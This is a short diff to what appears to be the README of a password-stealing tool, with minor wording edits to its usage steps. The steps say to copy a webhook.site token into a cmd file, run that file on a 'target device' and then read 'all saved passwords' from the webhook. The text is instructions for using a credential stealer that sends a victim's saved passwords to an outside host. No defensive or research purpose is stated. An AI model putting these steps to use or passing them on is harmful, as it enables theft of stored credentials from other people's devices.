@@ -4,8 +4,8 @@ Processor:
 
 1.  Go to https://webhook.site  and copy your webhook token.
 
-2.Paste webhook token to code.
+2.Paste webhook token in cmd code file and save it.
 
 3.Execuate this cmd file in target device.
 
-4. Visit your webhook site and you will find all saved passwords in target device.
+4.Visit your webhook site and you will find all saved passwords in target device.
